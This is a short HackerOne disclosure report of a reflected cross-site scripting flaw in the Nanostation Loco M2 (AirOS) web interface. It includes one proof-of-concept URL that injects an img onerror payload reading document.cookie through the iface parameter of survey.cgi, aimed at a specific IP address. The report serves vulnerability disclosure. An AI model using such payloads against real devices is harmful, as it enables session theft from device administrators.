# Reflected Xss in AirMax [Nanostation Loco M2]

## Report Details
- **Report ID**: 149287
- **URL**: https://hackerone.com/reports/149287
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2016-07-05T07:44:12.161Z
- **Disclosed**: 2016-12-12T20:36:13.955Z

## Reporter
- **Username**: b7882330c6060c6b277c5a1
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: ui

## Vulnerability Information
Dear James,

I've found a reflected xss in nanostation Loco M2.

just open this link and xss will execute.
http://172.98.67.89:22057/survey.cgi?iface=%22%3E%3Cimg%20src=x%20onerror=prompt(document.cookie)%3E

{F103333}

Best Regard
Shubham

## Attachments
- AirOS_Xss.png
